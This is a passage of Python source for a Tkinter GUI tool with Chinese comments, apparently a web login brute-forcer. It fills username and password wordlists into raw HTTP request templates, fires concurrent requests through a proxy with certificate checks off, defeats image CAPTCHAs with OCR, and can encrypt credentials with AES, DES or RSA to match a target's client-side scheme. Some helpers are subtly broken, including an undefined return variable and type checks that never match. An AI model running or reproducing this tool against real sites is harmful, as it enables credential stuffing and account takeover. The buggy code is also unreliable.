				# group.cancel()
				self.loop.run_until_complete(group)
				self.loop.close()
					
			#不加密
			else:
				items = self.respon1.get_children()
				[self.respon1.delete(item) for item in items]
				columns = ["userName","Code","Status","Length","resText"]
				width = 1006//len(columns)
				self.respon.pack_forget()
				self.s0.pack_forget()
				self.s1.pack(side=LEFT,fill=Y)
				self.respon1.pack(side=LEFT,fill=BOTH)
				self.respon1["columns"]=columns
				#加上标题+绑定排序函数
				for col in columns:
					self.respon1.column(col,width=width,anchor='center')
					self.respon1.heading(col, text=col, command=lambda _col=col: self.treeview_sort_column(_col, False))
				self.respon1.column(columns[-1],width=width,anchor='nw')
				
				self.loop = asyncio.new_event_loop()
				asyncio.set_event_loop(self.loop)
				tasks = []
				semaphore = asyncio.Semaphore(int(generalAllData[3]))
				tasks = [self.doGetRequests([userName,"user"],semaphore) for userName in userNames]
				group = asyncio.gather(*tasks,return_exceptions=True)
				# group.cancel()
				self.loop.run_until_complete(group)
				self.loop.close()

		#模式三：只爆破密码
		elif passwds and len(userNames)==0:
			encodePasswds = self.getEncodePass(generalAllData[5],passwds)
			#加密
			if encodePasswds!=None:
				items = self.respon1.get_children()
				[self.respon1.delete(item) for item in items]
				columns = ["Passwd","enPasswd","Code","Status","Length","resText"]
				width = 1006//len(columns)
				self.respon.pack_forget()
				self.s0.pack_forget()
				self.s1.pack(side=LEFT,fill=Y)
				self.respon1.pack(side=LEFT,fill=BOTH)
				self.respon1["columns"]=columns
				#加上标题+绑定排序函数
				for col in columns:
					self.respon1.column(col,width=width,anchor='center')
					self.respon1.heading(col, text=col, command=lambda _col=col: self.treeview_sort_column(_col, False))
				self.respon1.column(columns[-1],width=width,anchor='nw')
				
				self.loop = asyncio.new_event_loop()
				asyncio.set_event_loop(self.loop)
				tasks = []
				semaphore = asyncio.Semaphore(int(generalAllData[3]))
				tasks = [self.doGetRequests([encodePasswds[i],passwds[i],"pass"],semaphore) for i in range(len(encodePasswds))]
				group = asyncio.gather(*tasks,return_exceptions=True)
				# group.cancel()
				self.loop.run_until_complete(group)
				self.loop.close()
					
			#不加密
			else:
				items = self.respon1.get_children()
				[self.respon1.delete(item) for item in items]
				columns = ["Passwd","Code","Status","Length","resText"]
				width = 1006//len(columns)
				self.respon.pack_forget()
				self.s0.pack_forget()
				self.s1.pack(side=LEFT,fill=Y)
				self.respon1.pack(side=LEFT,fill=BOTH)
				self.respon1["columns"]=columns
				#加上标题+绑定排序函数
				for col in columns:
					self.respon1.column(col,width=width,anchor='center')
					self.respon1.heading(col, text=col, command=lambda _col=col: self.treeview_sort_column(_col, False))
				self.respon1.column(columns[-1],width=width,anchor='nw')
				
				self.loop = asyncio.new_event_loop()
				asyncio.set_event_loop(self.loop)
				tasks = []
				semaphore = asyncio.Semaphore(int(generalAllData[3]))
				tasks = [self.doGetRequests([passwd,"pass"],semaphore) for passwd in passwds]
				group = asyncio.gather(*tasks,return_exceptions=True)
				# group.cancel()
				self.loop.run_until_complete(group)
				self.loop.close()

		#未指定参数
		else:
			self.respon1.pack_forget()
			self.respon.pack(side=LEFT, fill=BOTH)
			self.respon.insert(tk.INSERT,"\n[!] 还未添加爆破的参数或添加字典，先指定爆破参数并添加字典")

	#blasting userName+passwd
	async def doGetRequests_one(self,dataList,semaphore):
		generalAllData = self.generalGetData()
		RawData = self.Entry7.get("1.0","end").strip("\n")
		baseUrl = urlparse(generalAllData[1]).scheme+"://"+urlparse(generalAllData[1]).netloc
		baseQuery = (urlparse(generalAllData[1]).query).split("=")[0]
		async with semaphore:
			async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
				#有验证码
				if generalAllData[0]!="" and "$code$" in RawData:
					if self.Entry3.get()!="":
						code,otherParams = self.getCode(session)
						if otherParams:
							for i in range(len(otherParams)):
								RawData = RawData.replace("$user$",dataList[0]).replace("$pass$",dataList[1]).replace("$code$",code).replace(f"$param{i}$",otherParams[i])
						else:
							RawData = RawData.replace("$user$",dataList[0]).replace("$pass$",dataList[1]).replace("$code$",code)
					else:
						code = self.getCode(session)
						RawData = RawData.replace("$user$",dataList[0]).replace("$pass$",dataList[1]).replace("$code$",code)
				#无验证码 parameter
				else:
					code = "null"
					session = requests.session()
					RawData = RawData.replace("$user$",dataList[0]).replace("$pass$",dataList[1])
				try:
					method,path,headers,pData = self.analysisRaw(RawData)
					url = baseUrl+path
					encodetype = self.Entry23.get()
					if method=="GET":
						headers["Content-Length"]=str(len(urlparse(url).query))
						if encodetype!='None':
							query = self.getEncodeRequests(encodetype,urlparse(url).query)
							url = urlparse(url).scheme+"://"+urlparse(url).netloc+urlparse(url).path+"?"+baseQuery+"="+query
						async with session.get(url=url,headers=headers,proxy=self.proxies,allow_redirects=False) as res:
							if len(dataList)==3:
								resText = await res.text()
								result = [dataList[0],dataList[1],code,str(res.status),str(len(resText)),resText.replace("\r\n","").replace("\n","")]
								self.respon1.insert('','end',values=[result[0],result[1],result[2],result[3],result[4],result[5]])
								return 0
							elif len(dataList)==4:
								resText = await res.text()
								result = [dataList[0],dataList[1],dataList[2],code,str(res.status),str(len(resText)),resText.replace("\r\n","").replace("\n","")]
								if dataList[3]=="user":
									self.respon1.insert('','end',values=[result[2],result[1],result[0],result[3],result[4],result[5],result[6]])
								elif dataList[3]=="pass":
									self.respon1.insert('','end',values=[result[0],result[2],result[1],result[3],result[4],result[5],result[6]])
								return 0
							elif len(dataList)==5:
								resText = await res.text()
								result = [dataList[0],dataList[1],dataList[2],dataList[3],code,str(res.status),str(len(resText)),resText.replace("\r\n","").replace("\n","")]
								self.respon1.insert('','end',values=[result[2],result[3],result[0],result[1],result[4],result[5],result[6],result[7]])
								return 0

					elif method=="POST":
						headers["Content-Length"]=str(len(pData))
						if encodetype!="None":
							pData = self.getEncodeRequests(encodetype,pData)
						async with session.post(url=url,data=pData,headers=headers,proxy=self.proxies,allow_redirects=False) as res:
							resText = await res.text()
							if len(dataList)==3:
								result = [dataList[0],dataList[1],code,str(res.status),str(len(resText)),resText.replace("\r\n","").replace("\n","")]
								self.respon1.insert('','end',values=[result[0],result[1],result[2],result[3],result[4],result[5]])
								return 0
							elif len(dataList)==4:
								result = [dataList[0],dataList[1],dataList[2],code,str(res.status),str(len(resText)),resText.replace("\r\n","").replace("\n","")]
								if dataList[3]=="user":
									self.respon1.insert('','end',values=[result[2],result[1],result[0],result[3],result[4],result[5],result[6]])
								elif dataList[3]=="pass":
									self.respon1.insert('','end',values=[result[0],result[2],result[1],result[3],result[4],result[5],result[6]])
								return 0
							elif len(dataList)==5:
								result = [dataList[0],dataList[1],dataList[2],dataList[3],code,str(res.status),str(len(resText)),resText.replace("\r\n","").replace("\n","")]
								self.respon1.insert('','end',values=[result[2],result[3],result[0],result[1],result[4],result[5],result[6],result[7]])
								return 0
				except Exception as e:
					print("Error:",e)
					pass

	#blasting userName/passwd
	async def doGetRequests(self,data,semaphore):
		generalAllData = self.generalGetData()
		RawData = self.Entry7.get("1.0","end").strip("\n")
		baseUrl = urlparse(generalAllData[1]).scheme+"://"+urlparse(generalAllData[1]).netloc
		baseQuery = (urlparse(generalAllData[1]).query).split("=")[0]
		async with semaphore:
			async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
				#有验证码
				if generalAllData[0] !="" and "$code$" in RawData:
					#有其他参数
					if self.Entry3.get()!="":
						code,otherParams = self.getCode(session)
						if otherParams:
							for i in range(len(otherParams)):
								if data[-1] == "user":
									RawData = RawData.replace("$user$",data[0]).replace("$code$",code).replace(f"$param{i}$",otherParams[i])
								elif data[-1] == "pass":
									RawData = RawData.replace("$pass$",data[0]).replace("$code$",code).replace(f"$param{i}$",otherParams[i])
						else:
							RawData = RawData.replace("$user$",data[0]).replace("$code$",code)
					#无其他参数
					else:
						code = self.getCode(session)
						if data[-1] == "user":
							RawData = RawData.replace("$user$",data[0]).replace("$code$",code)
						elif data[-1] == "pass":
							RawData = RawData.replace("$pass$",data[0]).replace("$code$",code)
				#无验证码
				else:
					code="null"
					session = requests.session()
					if data[-1] == "user":
						RawData = RawData.replace("$user$",data[0])
					elif data[-1] == "pass":
						RawData = RawData.replace("$pass$",data[0])
				#解析rawData
				try:
					method,path,headers,pData = self.analysisRaw(RawData)
					url = baseUrl+path
					encodetype = self.Entry23.get()
					if method=="GET":
						headers["Content-Length"]=str(len(urlparse(url).query))
						if encodetype!='None':
							query = self.getEncodeRequests(encodetype,urlparse(url).query)
							url = urlparse(url).scheme+"://"+urlparse(url).netloc+urlparse(url).path+"?"+baseQuery+"="+query
						async with session.get(url=url,headers=headers,proxy=self.proxies,allow_redirects=False) as res:
							resText = await res.text()
							if len(data)==2:
								result = [data[0],code,str(res.status),str(len(resText))]
								self.respon1.insert('','end',values=[result[0],result[1],result[2],result[3],resText.replace("\r\n","").replace("\n","")])
								return 0
							elif len(data)==3:
								result = [data[0],data[1],code,str(res.status),str(len(resText))]
								self.respon1.insert('','end',values=[result[1],result[0],result[2],result[3],result[4],resText.replace("\r\n","").replace("\n","")])
								return 0
					elif method=="POST":
						headers["Content-Length"]=str(len(pData))
						if encodetype!="None":
							pData = self.getEncodeRequests(encodetype,pData)
						async with session.post(url=url,data=pData,headers=headers,proxy=self.proxies,allow_redirects=False) as res:
							resText = await res.text()
							if len(data)==2:
								result = [data[0],code,str(res.status),str(len(resText))]
								self.respon1.insert('','end',values=[result[0],result[1],result[2],result[3],resText.replace("\r\n","").replace("\n","")])
								return 0
							elif len(data)==3:
								result = [data[0],data[1],code,str(res.status),str(len(resText))]
								self.respon1.insert('','end',values=[result[1],result[0],result[2],result[3],result[4],resText.replace("\r\n","").replace("\n","")])
								return 0
				except Exception as e:
					print("Error:",e)
					pass

	#通相对应的参数
	def generalGetData(self):
		codeUrl = self.Entry0.get().strip("\n")
		blastUrl = self.Entry4.get().strip("\n")
		Proxy = self.Entry8.get().strip("\n")
		threadNum = self.Entry9.get().strip("\n")
		userEncodetype = self.Entry12.get().strip("\n")
		passwdEncodetype = self.Entry13.get().strip("\n")
		return [codeUrl,blastUrl,Proxy,threadNum,userEncodetype,passwdEncodetype]

	#获取指定参数值
	def getParamer(self,paramerData,jsonData):
		tempData = jsonData
		if '->' in paramerData:
			paramerList = paramerData.split('->')
			for paramer in paramerList:
				tempData = tempData[paramer]
			return tempData
		else:
			return jsonData[paramerData]

	#getGcode
	def getCode(self,session):
		codeUrl = self.Entry0.get().strip()
		RawData = self.Entry6.get("1.0","end").strip("\n")
		method,headers,postData = self.analysisCodeRaw(RawData)
		myProxy = {'http':self.proxies,'https':self.proxies}
		code = ""
		othertemp = []
		# session = requests.session()
		if method=="GET":
			if self.Entry1.get() == "general":
				if codeUrl !="":
					ocr = ddddocr.DdddOcr(use_gpu=True,device_id=1)
					try:
						if self.Entry18.get()=="timestamp":
							re = session.get(url=codeUrl+str(int(round(time.time() * 1000))),headers=headers,proxies=myProxy,verify=False,timeout=3)
						elif self.Entry18.get()=="randomNum":
							re = session.get(url=codeUrl+str(random.random()),headers=headers,proxies=myProxy,verify=False,timeout=3)
						elif self.Entry18.get()=="None":
							re = session.get(url=codeUrl,headers=headers,proxies=myProxy,verify=False,timeout=3)
						code = ocr.classification(re.content)
						return code
					except Exception as e:
						return code

			elif self.Entry1.get() == "json":
				imgParam = self.Entry2.get().strip("\n")
				if codeUrl !="":
					ocr = ddddocr.DdddOcr(use_gpu=True,device_id=1)
					try:
						if self.Entry18.get()=="timestamp":
							re = session.get(url=codeUrl+str(int(round(time.time() * 1000))),headers=headers,proxies=myProxy,verify=False,timeout=3)
						elif self.Entry18.get()=="randomNum":
							re = session.get(url=codeUrl+str(random.random()),headers=headers,proxies=myProxy,verify=False,timeout=3)
						elif self.Entry18.get()=="None":
							re = session.get(url=codeUrl,headers=headers,proxies=myProxy,verify=False,timeout=3)
						imgb64Data = re.json()[imgParam]
						if "base64" in imgb64Data:
							imgb64Data = imgb64Data.split(",")[1]
						code = ocr.classification(base64.b64decode(bytes(imgb64Data,encoding="utf-8")))
						if self.Entry3.get().strip("\n")=="":
							return code
						else:
							otherParams = self.Entry3.get().strip("\n").replace(" ","").split(",")
							for otherParam in otherParams:
								othertemp.append(self.getParamer(otherParam,re.json()))
							return code,othertemp
					except Exception as e:
						return code,othertemp

		elif method=="POST":
			if self.Entry1.get() == "general":
				if codeUrl !="":
					ocr = ddddocr.DdddOcr(use_gpu=True,device_id=1)
					try:
						if self.Entry18.get()=="timestamp":
							re = session.post(url=codeUrl+str(int(round(time.time() * 1000))),data=postData,headers=headers,proxies=myProxy,verify=False,timeout=3)
						elif self.Entry18.get()=="randomNum":
							re = session.post(url=codeUrl+str(random.random()),data=postData,headers=headers,proxies=myProxy,verify=False,timeout=3)
						elif self.Entry18.get()=="None":
							re = session.post(url=codeUrl,data=postData,headers=headers,proxies=myProxy,verify=False,timeout=3)
						code = ocr.classification(re.content)
						return code
					except Exception as e:
						return code

			elif self.Entry1.get() == "json":
				imgParam = self.Entry2.get().strip("\n")
				if codeUrl !="":
					ocr = ddddocr.DdddOcr(use_gpu=True,device_id=1)
					try:
						if self.Entry18.get()=="timestamp":
							re = session.post(url=codeUrl+str(int(round(time.time() * 1000))),data=postData,headers=headers,proxies=myProxy,verify=False,timeout=3)
						elif self.Entry18.get()=="randomNum":
							re = session.post(url=codeUrl+str(random.random()),data=postData,headers=headers,proxies=myProxy,verify=False,timeout=3)
						elif self.Entry18.get()=="None":
							re = session.post(url=codeUrl,data=postData,headers=headers,proxies=myProxy,verify=False,timeout=3)
						imgb64Data = re.json()[imgParam]
						if "base64" in imgb64Data:
							imgb64Data = imgb64Data.split(",")[1]
						code = ocr.classification(base64.b64decode(bytes(imgb64Data,encoding="utf-8")))
						if self.Entry3.get().strip("\n")=="":
							return code
						else:
							otherParams = self.Entry3.get().strip("\n").replace(" ","").split(",")
							for otherParam in otherParams:
								othertemp.append(self.getParamer(otherParam,re.json()))
							return code,othertemp
					except Exception as e:
						return code,othertemp

	#请求前获取+处理users字典
	def getUsers(self):
		usersData = self.Entry10.get("1.0","end")
		temp = usersData.split("\n")
		userNames = []
		for userName in temp:
			if userName != "":
				userNames.append(userName)
		return userNames

	def getPasswds(self):
		passwdsData = self.Entry11.get("1.0","end")
		temp = passwdsData.split("\n")
		passwds = []
		for passwd in temp:
			if passwd != "":
				passwds.append(passwd)
		return passwds

	#getUserEncode
	def getEncodeUser(self,encodetype,userNames):
		if encodetype=="Hex":
			encodeUserNames = self.HexEncode(userNames)
			return encodeUserNames
		elif encodetype=="URL":
			encodeUserNames = self.UrlEncode(userNames)
			return encodeUserNames
		elif encodetype=="Base32":
			encodeUserNames = self.Base32Encode(userNames)
			return encodeUserNames
		elif encodetype=="Base64":
			encodeUserNames = self.Base64Encode(userNames)
			return encodeUserNames
		elif encodetype=="MD5_16":
			encodeUserNames = self.MD5_16Encode(userNames)
			return encodeUserNames
		elif encodetype=="MD5_32":
			encodeUserNames = self.MD5_32Encode(userNames)
			return encodeUserNames
		elif encodetype=="Sha1":
			encodeUserNames = self.Sha1Encode(userNames)
			return encodeUserNames
		elif encodetype=="Sha224":
			encodeUserNames = self.Sha224Encode(userNames)
			return encodeUserNames
		elif encodetype=="Sha256":
			encodeUserNames = self.Sha256Encode(userNames)
			return encodeUserNames
		elif encodetype=="Sha384":
			encodeUserNames = self.Sha384Encode(userNames)
			return encodeUserNames
		elif encodetype=="Sha512":
			encodeUserNames = self.Sha512Encode(userNames)
			return encodeUserNames
		elif encodetype=="AES_ECB":
			encodeUserNames = self.AES_ECBEncode(userNames)
			return encodeUserNames
		elif encodetype=="AES_CBC":
			encodeUserNames = self.AES_CBCEncode(userNames)
			return encodeUserNames
		elif encodetype=="DES":
			encodeUserNames = self.DESEncode(userNames)
			return encodeUserNames
		elif encodetype=="RSA":
			encodeUserNames = self.RSAEncode(userNames)
			return encodeUserNames
		else:
			return None

	#getPassEncode
	def getEncodePass(self,encodetype,passwds):
		if encodetype=="Hex":
			encodePasswds = self.HexEncode(passwds)
			return encodePasswds
		elif encodetype=="URL":
			encodePasswds = self.UrlEncode(passwds)
			return encodePasswds
		elif encodetype=="Base32":
			encodePasswds = self.Base32Encode(passwds)
			return encodePasswds
		elif encodetype=="Base64":
			encodePasswds = self.Base64Encode(passwds)
			return encodePasswds
		elif encodetype=="MD5_16":
			encodePasswds = self.MD5_16Encode(passwds)
			return encodePasswds
		elif encodetype=="MD5_32":
			encodePasswds = self.MD5_32Encode(passwds)
			return encodePasswds
		elif encodetype=="Sha1":
			encodePasswds = self.Sha1Encode(passwds)
			return encodePasswds
		elif encodetype=="Sha224":
			encodePasswds = self.Sha224Encode(passwds)
			return encodePasswds
		elif encodetype=="Sha256":
			encodePasswds = self.Sha256Encode(passwds)
			return encodePasswds
		elif encodetype=="Sha384":
			encodePasswds = self.Sha384Encode(passwds)
			return encodePasswds
		elif encodetype=="Sha512":
			encodePasswds = self.Sha512Encode(passwds)
			return encodePasswds
		elif encodetype=="AES_ECB":
			encodePasswds = self.AES_ECBEncode(passwds)
			return encodePasswds
		elif encodetype=="AES_CBC":
			encodePasswds = self.AES_CBCEncode(passwds)
			return encodePasswds
		elif encodetype=="DES":
			encodePasswds = self.DESEncode(passwds)
			return encodePasswds
		elif encodetype=="RSA":
			encodePasswds = self.RSAEncode(passwds)
			return encodePasswds
		else:
			return None

	#请求体加密
	def getEncodeRequests(self,encodetype,requestsData):
		if encodetype=="Hex":
			return self.HexEncode(requestsData)
		elif encodetype=="Sha1":
			return self.Sha1Encode(requestsData)
		elif encodetype=="Sha224":
			return self.Sha224Encode(requestsData)
		elif encodetype=="Sha256":
			return self.Sha256Encode(requestsData)
		elif encodetype=="Sha384":
			return self.Sha384Encode(requestsData)
		elif encodetype=="Sha512":
			return self.Sha512Encode(requestsData)
		elif encodetype=="AES_ECB":
			return self.AES_ECBEncode(requestsData)
		elif encodetype=="AES_CBC":
			return self.AES_CBCEncode(requestsData)
		elif encodetype=="DES":
			return self.DESEncode(requestsData)
		elif encodetype=="RSA":
			return self.RSAEncode(requestsData)

	#加密函数
	def UrlEncode(self,dataList):
		temp = []
		for data in dataList:
			temp.append(quote(data))
		return timp

	def Sha512Encode(self,dataList):
		if type(dataList) == "<class 'list'>":
			temp = []
			m = hashlib.sha512()
			for data in dataList:
				m.update(data.encode("utf-8"))
				temp.append(m.hexdigest())
			return temp
		else:
			m = hashlib.sha512()
			m.update(dataList.encode("utf-8"))
			return m.hexdigest()

	def Sha384Encode(self,dataList):
		if type(dataList) == "<class 'list'>":
			temp = []
			m = hashlib.sha384()
			for data in dataList:
				m.update(data.encode("utf-8"))
				temp.append(m.hexdigest())
			return temp
		else:
			m = hashlib.sha384()
			m.update(dataList.encode("utf-8"))
			return m.hexdigest()

	def Sha256Encode(self,dataList):
		if type(dataList) == "<class 'list'>":
			temp = []
			m = hashlib.sha256()
			for data in dataList:
				m.update(data.encode("utf-8"))
				temp.append(m.hexdigest())
			return temp
		else:
			m = hashlib.sha256()
			m.update(dataList.encode("utf-8"))
			return m.hexdigest()

	def Sha224Encode(self,dataList):
		if type(dataList) == "<class 'list'>":
			temp = []
			m = hashlib.sha224()
			for data in dataList:
				m.update(data.encode("utf-8"))
				temp.append(m.hexdigest())
			return temp
		else:
			m = hashlib.sha224()
			m.update(dataList.encode("utf-8"))
			return m.hexdigest()

	def Sha1Encode(self,dataList):
		if type(dataList) == "<class 'list'>":
			temp = []
			m = hashlib.sha1()
			for data in dataList:
				m.update(data.encode("utf-8"))
				temp.append(m.hexdigest())
			return temp
		else:
			m = hashlib.sha1()
			m.update(dataList.encode("utf-8"))
			return m.hexdigest()

	def MD5_32Encode(self,dataList):
		temp = []
		m = hashlib.md5()
		for data in dataList:
			m.update(data.encode("utf-8"))
			temp.append(m.hexdigest())
		return temp

	def MD5_16Encode(self,dataList):
		temp = []
		m = hashlib.md5()
		for data in dataList:
			m.update(data.encode("utf-8"))
			temp.append(m.hexdigest()[8:24])
		return temp

	def Base64Encode(self,dataList):
		temp = []
		for data in dataList:
			temp.append(str(base64.b64encode(data.encode("utf-8")),"utf-8"))
		return temp

	def Base32Encode(self,dataList):
		temp = []
		for data in dataList:
			temp.append(str(base64.b32encode(data.encode("utf-8")),"utf-8"))
		return temp

	def HexEncode(self,dataList):
		if type(dataList)=="<class 'list'>":
			temp = []
			for data in dataList:
				temp.append(base64.b16encode(data.encode("utf-8")).decode("utf-8"))
			return temp
		else:
			return base64.b16encode(dataList.encode("utf-8")).decode("utf-8")

	def AES_ECBEncode(self,dataList):
		outputFormat = str(self.Entry19.get()).strip("\n")
		key = str(self.Entry14.get()).strip("\n")
		#填充key长度为8的倍数（16、24、32位）
		while len(key) % 8 !=0:
			key += '\0'
		if type(dataList)=="<class 'list'>":
			temp = []
			for data in dataList:
				#位数不够，补空格
				BS = AES.block_size
				pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
				data = pad(data).encode("utf-8")
				mode = AES.MODE_ECB
				cryptor = AES.new(key.encode('utf8'), mode)
				# 目前AES-128 足够目前使用(EBC加密)
				ciphertext = cryptor.encrypt(data)
				# format
				if outputFormat == 'base64':
					# base64加密
					temp.append(quote(base64.b64encode(ciphertext).decode("utf-8")))
				elif outputFormat == 'HEX':
					temp.append(binascii.b2a_hex(ciphertext).decode('utf-8'))
			return temp
		else:
			#位数不够，补空格
			BS = AES.block_size
			pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
			data = pad(dataList).encode("utf-8")
			mode = AES.MODE_ECB
			cryptor = AES.new(key.encode('utf8'), mode)
			# 目前AES-128 足够目前使用(EBC加密)
			ciphertext = cryptor.encrypt(data)
			# format
			if outputFormat == 'base64':
				return quote(base64.b64encode(ciphertext).decode("utf-8"))
			elif outputFormat == 'HEX':
				return binascii.b2a_hex(ciphertext).decode('utf-8')

	#CBC模式比EBC模式多一个iv(偏移量)
	def AES_CBCEncode(self,dataList):
		outputFormat = str(self.Entry19.get()).strip("\n")
		key = str(self.Entry14.get()).strip("\n")
		#填充key长度为8的倍数（16、24、32位）
		while len(key) % 8 !=0:
			key += '\0'
		iv = str(self.Entry15.get()).strip("\n")
		#填充iv长度为16的倍数
		while len(iv) % 16 !=0:
			iv += '\0'
		if type(dataList)=="<class 'list'>":
			temp = []
			for data in dataList:
				#位数不够，补空格
				BS = AES.block_size
				pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
				data = pad(data).encode("utf-8")
				mode = AES.MODE_CBC
				cryptor = AES.new(key.encode('utf8'), mode, iv.encode('utf8'))
				# 目前AES-128 足够目前使用(CBC加密)
				ciphertext = cryptor.encrypt(data)
				#format
				if outputFormat == 'base64':
					temp.append(quote(base64.b64encode(ciphertext).decode("utf-8")))
				elif outputFormat == 'HEX':
					temp.append(binascii.b2a_hex(ciphertext).decode('utf-8'))
			return temp
		else:
			#位数不够，补空格
			BS = AES.block_size
			pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
			data = pad(dataList).encode("utf-8")
			mode = AES.MODE_CBC
			cryptor = AES.new(key.encode('utf8'), mode, iv.encode('utf8'))
			# 目前AES-128 足够目前使用(CBC加密)
			ciphertext = cryptor.encrypt(data)
			#format
			if outputFormat == 'base64':
				return quote(base64.b64encode(ciphertext).decode("utf-8"))
			elif outputFormat == 'HEX':
				return binascii.b2a_hex(ciphertext).decode('utf-8')

	def DESEncode(self,dataList):
		outputFormat = str(self.Entry19.get()).strip("\n")
		# 密钥
		key = bytes(str(self.Entry14.get()).strip("\n"), encoding = "utf8")
		# 生成一个DES对象
		des = DES.new(key, DES.MODE_ECB)
		if type(dataList)=="<class 'list'>":
			temp = []
			for data in dataList:
				#位数不够，补空格
				while len(data) % 8 !=0:
					data += '\0'
				# 加密的过程
				encrypto_text = des.encrypt(data.encode('utf-8'))
				#format
				if outputFormat == 'base64':
					temp.append(quote(base64.b64encode(encrypto_text).decode("utf-8")))
				elif outputFormat == 'HEX':
					temp.append(binascii.b2a_hex(encrypto_text).decode('utf-8'))
			return temp
		else:
			#位数不够，补空格
			while len(dataList) % 8 !=0:
				dataList += '\0'
			# 加密的过程
			encrypto_text = des.encrypt(dataList.encode('utf-8'))
			#format
			if outputFormat == 'base64':
				return quote(base64.b64encode(encrypto_text).decode("utf-8"))
			elif outputFormat == 'HEX':
				return binascii.b2a_hex(encrypto_text).decode('utf-8')

	def RSAEncode(self, dataList):
		if self.Entry20.get()=='PublicKey':
			key = self.Entry16.get().strip("\n")
			start = '-----BEGIN RSA PUBLIC KEY-----\n'
			end = '-----END RSA PUBLIC KEY-----'
			result = ''
			# 分割key，每64位长度换一行
			divide = int(len(key) / 64)
			divide = divide if (divide > 0) else divide + 1
			line = divide if (len(key) % 64 == 0) else divide + 1
			for i in range(line):
			    result += key[i * 64:(i + 1) * 64] + '\n'
			pub_key = start + result + end
			outputFormat = str(self.Entry19.get()).strip("\n")
			if type(dataList)=="<class 'list'>":
				temp = []
				for data in dataList:
					pub = RSA.import_key(pub_key)
					cipher = PKCS1_v1_5.new(pub)
					encrypt_bytes = cipher.encrypt(data.encode(encoding='utf-8'))
					# format
					if outputFormat == 'base64':
						temp.append(quote(base64.b64encode(encrypt_bytes).decode('utf-8')))
					elif outputFormat == 'HEX':
						temp.append(binascii.b2a_hex(encrypt_bytes).decode('utf-8'))
				return temp
			else:
				pub = RSA.import_key(pub_key)
				cipher = PKCS1_v1_5.new(pub)
				encrypt_bytes = cipher.encrypt(dataList.encode(encoding='utf-8'))
				# format
				if outputFormat == 'base64':
					return quote(base64.b64encode(encrypt_bytes).decode('utf-8'))
				elif outputFormat == 'HEX':
					return binascii.b2a_hex(encrypt_bytes).decode('utf-8')

		elif self.Entry20.get()=='ModulusAndExponent':
			modulus = self.Entry21.get()
			exponent = self.Entry22.get()
			public_exponent = int(exponent,16)#指数
			public_modulus=int(modulus,16) #模
			max_length = 117
			public_key = rsa.RSAPublicNumbers(public_exponent, public_modulus).public_key(default_backend())
			pem = public_key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo)
			if type(dataList)=="<class 'list'>":
				temp = []
				for data in dataList:
					tempdata = b''
					for i in range(0, len(data), max_length):
						tempdata += public_key.encrypt(data[i: i + max_length].encode(),padding.PKCS1v15())
					outputFormat = str(self.Entry19.get()).strip("\n")
					if outputFormat == 'base64':
						temp.append(quote(base64.b64encode(tempdata).decode('utf-8')))
					elif outputFormat == 'HEX':
						temp.append(binascii.b2a_hex(tempdata).decode('utf-8'))
				return temp
			else:
				tempdata = b''
				for i in range(0, len(dataList), max_length):
					tempdata += public_key.encrypt(dataList[i: i + max_length].encode(),padding.PKCS1v15())
				outputFormat = str(self.Entry19.get()).strip("\n")
				if outputFormat == 'base64':
					return quote(base64.b64encode(tempdata).decode('utf-8'))
				elif outputFormat == 'HEX':
					return binascii.b2a_hex(tempdata).decode('utf-8')

	#清空
	def clearRespon(self):
		self.respon.delete("1.0","end")
		items = self.respon1.get_children()
		if items:
			[self.respon1.delete(item) for item in items]

	def clearUsers(self):
		self.Entry10.delete("1.0","end")
		# self.Entry3Text.set("")

	def clearPass(self):

		self.Entry11.delete("1.0","end")

	#测试验证码识别
	def testCode(self):
		codeUrl = self.Entry0.get().strip()
		RawData = self.Entry6.get("1.0","end").strip("\n")
		method,headers,postData = self.analysisCodeRaw(RawData)
		try:
			if self.Entry0.get()!="":
				proxies = {"http":self.Entry8.get().strip("\n"),"https":self.Entry8.get().strip("\n")}
				if method=="GET":
					if self.Entry1.get() == "general":
						if self.Entry18.get() == "timestamp":
							re = requests.get(url=codeUrl+str(int(round(time.time() * 1000))),headers=headers,proxies=proxies,timeout=3,verify=False)
						elif self.Entry18.get() == "randomNum":
							re = requests.get(url=codeUrl+str(random.random()),headers=headers,proxies=proxies,timeout=3,verify=False)
						elif self.Entry18.get()=="None":
							re = requests.get(url=codeUrl,headers=headers,proxies=proxies,verify=False,timeout=3)
						ocr = ddddocr.DdddOcr(use_gpu=True,device_id=1)
						code = ocr.classification(re.content)
						self.respon1.pack_forget()
						self.respon.pack(side=LEFT, fill=BOTH)
						self.respon.delete("1.0","end")
						self.respon.insert(tk.INSERT,"[+] 成功识别图形码：{}\n[+] 可对比./test.png图片来验证识别结果".format(code))
						self.writefile(re.content)
					elif self.Entry1.get() == "json":
						imgParam = self.Entry2.get().strip("\n")
						if self.Entry18.get() == "timestamp":
							re = requests.get(url=codeUrl+str(int(round(time.time() * 1000))),headers=headers,verify=False,proxies=proxies,timeout=3)
						elif self.Entry18.get() == "randomNum":
							re = requests.get(url=codeUrl+str(random.random()),headers=headers,proxies=proxies,verify=False,timeout=3)
						elif self.Entry18.get()=="None":
							re = requests.get(url=codeUrl,headers=headers,proxies=proxies,verify=False,timeout=3)
						imgB64Data = re.json()[imgParam]
						if "base64" in imgB64Data:
							imgB64Data = imgB64Data.split(",")[1]
						imgData = bytes(imgB64Data,encoding="utf8")
						ocr = ddddocr.DdddOcr(use_gpu=True,device_id=1)
						code = ocr.classification(base64.b64decode(imgData))
						if self.Entry3.get().strip("\n")=="":
							self.respon1.pack_forget()
							self.respon.pack(side=LEFT, fill=BOTH)
							self.respon.delete("1.0","end")
							self.respon.insert(tk.INSERT,"[+] 成功识别图形码：{}\n[+] 可对比./test.png图片来验证识别结果".format(code))
						else:
							temp = []
							otherParams = self.Entry3.get().strip("\n").replace(" ","").split(",")
							for otherParam in otherParams:
								temp.append(re.json()[otherParam])
							self.respon1.pack_forget()
							self.respon.pack(side=LEFT, fill=BOTH)
							self.respon.delete("1.0","end")
							self.respon.insert(tk.INSERT,"[+] 成功识别图形码：{}\n[+] 可对比./test.png图片来验证识别结果\n".format(code))
